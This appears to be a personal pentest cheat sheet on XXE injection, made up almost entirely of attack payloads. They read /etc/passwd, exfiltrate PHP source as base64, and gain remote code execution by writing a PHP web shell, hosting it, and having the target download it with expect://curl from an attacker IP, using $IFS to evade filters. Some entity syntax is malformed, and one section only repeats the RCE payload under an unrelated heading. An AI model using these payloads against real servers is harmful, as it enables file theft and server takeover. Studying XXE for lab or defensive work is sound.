# Local File Disclosure
## Identifying
First of all, we have to see if the request is sending in XML format
To start fo the testing we can add in the second line or after of <?xml version="x.x" encoding="xxxx"?>
```bash
<!DOCTYPE "SECTION" [
  <!ENTITY "Dynamic Word" "Inlane Freight">
]>
```
## Reading Sensitive Files
```bash
<!DOCTYPE "SECTION" [
  <!ENTITY "Dynamic Word" SYSTEM "file:///etc/passwd">
]>
```
## Reading Source Code
It's better endoced to base64, because the code could have speacial caracters that break the Response
```bash
<!DOCTYPE "SECTION" [
  <!ENTITY "Dynamic Word" SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
## Remote Code Execution with XXE
Creating connection
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```
Payload
```bash
<!DOCTYPE "SECTION"[
  <!ENTITY "Dynamic Word" SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```
## Example
```bash
<?xml version="1.0"?>
#Section Name
<!DOCTYPE email [ 
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
# Dynamic word
<email>&company;</email>
<message></message>
</root>
```

# Advanced File Disclosure
```bash
<!DOCTYPE "SECTION"[
  <!ENTITY "Dynamic Word" SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```
